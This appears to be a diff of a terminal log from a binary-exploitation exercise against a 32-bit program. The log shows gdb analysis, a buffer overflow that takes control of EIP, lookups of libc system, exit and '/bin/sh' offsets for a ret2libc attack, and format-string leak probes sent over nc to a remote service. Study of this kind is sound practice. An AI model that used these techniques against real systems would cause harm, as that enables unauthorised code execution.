@@ -1,5 +1,15 @@
 parmy@fedora:~$ ls
 DigitsOnTurbo  hello  libc-2.23.so  triangle  turbo-digits
+parmy@fedora:~$ ldd ./hello
+	linux-gate.so.1 (0xf7fc2000)
+	libc.so.6 => /lib/libc.so.6 (0xf7da2000)
+	/lib/ld-linux.so.2 (0xf7fc5000)
+parmy@fedora:~$ file hello
+hello: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7127bd110537157d57a84d0ddc674e1796cf5b57, not stripped
+parmy@fedora:~$ /lib/ld-linux.so.2 --library-path . ./hello
+What's your name?
+Guntas
+Hello, Guntas!
 parmy@fedora:~$ gdb ./hello
 GNU gdb (Fedora Linux) 16.3-1.fc42
 Copyright (C) 2024 Free Software Foundation, Inc.
@@ -20,10 +30,9 @@ Reading symbols from ./hello...
 
 This GDB supports auto-downloading debuginfo from the following URLs:
   <https://debuginfod.fedoraproject.org/>
-Enable debuginfod for this session? (y or [n]) y
-Debuginfod has been enabled.
-To make this setting permanent, add 'set debuginfod enabled on' to .gdbinit.
-Download failed: Connection refused.  Continuing without separate debug info for /home/parmy/hello.
+Enable debuginfod for this session? (y or [n]) n
+Debuginfod has been disabled.
+To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
 (No debugging symbols found in ./hello)
 (gdb) info functions
 All defined functions:
@@ -51,26 +60,6 @@ Non-debugging symbols:
 0x08048700  __libc_csu_init
 0x08048760  __libc_csu_fini
 0x08048764  _fini
-(gdb) disassemble frame_dummy
-Dump of assembler code for function frame_dummy:
-   0x080485d0 <+0>:	mov    $0x8049f10,%eax
-   0x080485d5 <+5>:	mov    (%eax),%edx
-   0x080485d7 <+7>:	test   %edx,%edx
-   0x080485d9 <+9>:	jne    0x80485e0 <frame_dummy+16>
-   0x080485db <+11>:	jmp    0x8048570 <register_tm_clones>
-   0x080485dd <+13>:	lea    0x0(%esi),%esi
-   0x080485e0 <+16>:	mov    $0x0,%edx
-   0x080485e5 <+21>:	test   %edx,%edx
-   0x080485e7 <+23>:	je     0x80485db <frame_dummy+11>
-   0x080485e9 <+25>:	push   %ebp
-   0x080485ea <+26>:	mov    %esp,%ebp
-   0x080485ec <+28>:	sub    $0x14,%esp
-   0x080485ef <+31>:	push   %eax
-   0x080485f0 <+32>:	call   *%edx
-   0x080485f2 <+34>:	add    $0x10,%esp
-   0x080485f5 <+37>:	leave
-   0x080485f6 <+38>:	jmp    0x8048570 <register_tm_clones>
-End of assembler dump.
 (gdb) disassemble say_hello
 Dump of assembler code for function say_hello:
    0x080485fb <+0>:	push   %ebp
@@ -162,15 +151,13 @@ Dump of assembler code for function main:
    0x080486fd <+196>:	leave
    0x080486fe <+197>:	ret
 End of assembler dump.
-(gdb) run
+(gdb) r
 Starting program: /home/parmy/hello
-Download failed: Connection refused.  Continuing without separate debug info for system-supplied DSO at 0xf7fc4000.
-Download failed: Connection refused.  Continuing without separate debug info for /lib/libc.so.6.
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/lib64/libthread_db.so.1".
 What's your name?
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
 
 Program received signal SIGSEGV, Segmentation fault.
 0x41414141 in ?? ()
@@ -180,7 +167,7 @@ eax            0x2                 2
 ecx            0x0                 0
 edx            0xf7f9a8e8          -134633240
 ebx            0xf7f98e34          -134640076
-esp            0xffffd1e8          0xffffd1e8
+esp            0xffffd1b8          0xffffd1b8
 ebp            0x41414141          0x41414141
 esi            0x0                 0
 edi            0xf7ffcb60          -134231200
@@ -200,4 +187,78 @@ k4             0x0                 0
 k5             0x0                 0
 k6             0x0                 0
 k7             0x0                 0
-(gdb)
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7dd6050 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7dc0dc0 <exit>
+(gdb) info proc map
+process 849002
+Mapped address spaces:
+
+Start Addr End Addr   Size       Offset     Perms File
+0x08048000 0x08049000 0x1000     0x0        r-xp  /home/parmy/hello
+0x08049000 0x0804a000 0x1000     0x0        r--p  /home/parmy/hello
+0x0804a000 0x0804b000 0x1000     0x1000     rw-p  /home/parmy/hello
+0x0804b000 0x0806d000 0x22000    0x0        rw-p  [heap]
+0xf7da4000 0xf7f03000 0x15f000   0x0        r-xp  /usr/lib/libc.so.6
+0xf7f03000 0xf7f97000 0x94000    0x15f000   r--p  /usr/lib/libc.so.6
+0xf7f97000 0xf7f99000 0x2000     0x1f3000   r--p  /usr/lib/libc.so.6
+0xf7f99000 0xf7f9a000 0x1000     0x1f5000   rw-p  /usr/lib/libc.so.6
+0xf7f9a000 0xf7f9f000 0x5000     0x0        rw-p
+0xf7fbc000 0xf7fbe000 0x2000     0x0        rw-p
+0xf7fbe000 0xf7fc2000 0x4000     0x0        r--p  [vvar]
+0xf7fc2000 0xf7fc4000 0x2000     0x0        r--p  [vvar_vclock]
+0xf7fc4000 0xf7fc7000 0x3000     0x0        r-xp  [vdso]
+0xf7fc7000 0xf7fec000 0x25000    0x0        r-xp  /usr/lib/ld-linux.so.2
+0xf7fec000 0xf7ffb000 0xf000     0x25000    r--p  /usr/lib/ld-linux.so.2
+0xf7ffb000 0xf7ffd000 0x2000     0x34000    r--p  /usr/lib/ld-linux.so.2
+0xf7ffd000 0xf7ffe000 0x1000     0x36000    rw-p  /usr/lib/ld-linux.so.2
+0xfffdd000 0xffffe000 0x21000    0x0        rw-p  [stack]
+(gdb) q
+parmy@fedora:~$ strings -a -t x ./libc-2.23.so | grep "/bin/sh"
+ 15912b /bin/sh
+parmy@fedora:~$ objdump -R hello
+
+hello:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049ffc R_386_GLOB_DAT    __gmon_start__
+0804a040 R_386_COPY        stderr@GLIBC_2.0
+0804a060 R_386_COPY        stdin@GLIBC_2.0
+0804a064 R_386_COPY        stdout@GLIBC_2.0
+0804a00c R_386_JUMP_SLOT   setbuf@GLIBC_2.0
+0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
+0804a014 R_386_JUMP_SLOT   free@GLIBC_2.0
+0804a018 R_386_JUMP_SLOT   strcpy@GLIBC_2.0
+0804a01c R_386_JUMP_SLOT   realloc@GLIBC_2.0
+0804a020 R_386_JUMP_SLOT   malloc@GLIBC_2.0
+0804a024 R_386_JUMP_SLOT   puts@GLIBC_2.0
+0804a028 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+0804a02c R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
+
+parmy@fedora:~$ strings -a -t x ./libc-2.23.so | grep "/bin/sh"
+ 15912b /bin/sh
+parmy@fedora:~$ readelf -s libc-2.23.so | grep system
+  1457: 0003a950    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+parmy@fedora:~$ readelf -s libc-2.23.so | grep " exit@@"
+   141: 0002e7c0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+parmy@fedora:~$ readelf -s libc-2.23.so | grep puts
+   205: 0005f150   464 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.0
+   434: 0005f150   464 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.0
+   509: 000e9f50  1162 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.0
+   697: 000eb560   649 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
+  1182: 0005dc00   349 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.0
+  1736: 0005dc00   349 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.0
+  2389: 00067500   146 FUNC    WEAK   DEFAULT   13 fputs[...]@@GLIBC_2.1
+
+============================================================================================================================================================================================================================================================
+
+❯ nc 10.0.118.104 3377
+What's your name?
+AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+Hello, AAAA.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0xf7007025.0xf7f36000.0x9554008!
+❯ nc 10.0.118.104 3377
+What's your name?
+AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+Hello, AAAA.41414141.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.f7007825.f7d9e1d2!
